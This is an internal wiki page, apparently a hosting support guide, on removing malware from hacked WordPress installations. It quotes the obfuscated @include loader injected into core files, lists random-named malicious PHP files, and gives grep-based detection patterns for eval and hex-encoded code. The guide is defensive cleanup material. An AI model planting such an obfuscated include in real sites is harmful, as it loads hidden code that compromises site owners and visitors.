<!--
title: Malware cleaning in Shared accounts (Wordpress hacks) 
description: 
published: true
date: 2021-06-20T03:38:48.252Z
tags: 
editor: ckeditor
dateCreated: 2021-06-20T03:38:48.252Z
-->

<h2><span class="text-small">You can see similar pattern for Wordpress hacks. Do follow the below steps to clear it:</span></h2>
<h3><span class="text-small"><strong>1. First clean main Wordpress files, Mostly 3 files</strong></span></h3>
<p><span class="text-small">index.php</span></p>
<p><span class="text-small">wp-config.php</span></p>
<p><span class="text-small">wp-settings.php</span></p>
<p><span class="text-small">You will see following code injected at top, delete these carefully don't break php tags&nbsp;</span></p>
<pre><code class="language-plaintext">/*a6170*/
@include "\057dat\141/h/\150olm\145rs/\150olm\145rs.\143om/\160ubl\151c_h\164ml/\137cus\165di/\056a5a\06596b\145.ic\157";
/*a6170*/</code></pre>
<h3><span class="text-small"><strong>2.&nbsp; When decoding above hex code, it is including random hidden files name&nbsp; as&nbsp; .XXX.ico. so search for that</strong></span></h3>
<pre><code class="language-plaintext">find ./ -name .*.ico&nbsp;     (There is a dot in beginning)&nbsp; and delete them</code></pre>
<h3><span class="text-small"><strong>3. Look for random file names&nbsp; like these in main directory and delete them</strong></span><br>&nbsp;</h3>
<pre><code class="language-plaintext">2qgr0vkm.php
3ypvg7rm.php
4phyeudf.php
.0bc71.php
.c3cbd.php</code></pre>
<h3><span class="text-small"><strong>4. Delete any suspicious files in Wordpress accounts.</strong>&nbsp;</span></h3>
<ul>
  <li><span class="text-small">Any suspicious file name as random as above, delete them (you can view content if you want)</span></li>
  <li><span class="text-small">Any php files at wrong locations like in images directory or in uploads directory, open and if looks suspicious delete them</span></li>
  <li><span class="text-small">Below are find commands , execute one by one to find more suspicious files:</span><br><span class="text-small">If these find statements return legit files of wordpress, open few of them randomly, remove injected code lines, you will know they are injected by looking at them, it is mostly hex code</span></li>
</ul>
<pre><code class="language-plaintext">                 find . -type f -name '*.php' | xargs grep -l "eval *(" --color
                 find . -type f -name '*.php' | xargs grep -l "\x47" --color
                 find . -type f -name '*.php' | xargs grep -l "\057d" --color
                 find . -type f -name '*.php' | xargs grep -l "gccgum" --color
                 find . -type f -name '*.php' | xargs grep -l "O0O0_OO0" --color
                 find . -type f -name '*.php' | xargs grep -l "file_put_contents" --color
                 find . -type f -name '*.php' | xargs grep -l "error_reporting" --color
                 find . -type f -name '*.php' | xargs grep -l "2boH81cpdue5gt" --color
                 find . -type f -name '*.php' | xargs grep -l "tizimz" --color
                 find . -type f -name '*.php' | xargs grep -l "oblqvga" --color</code></pre>
<p><br><span class="text-small"><strong>5.&nbsp;Update wordpress/themes/plugins&nbsp;</strong></span></p>
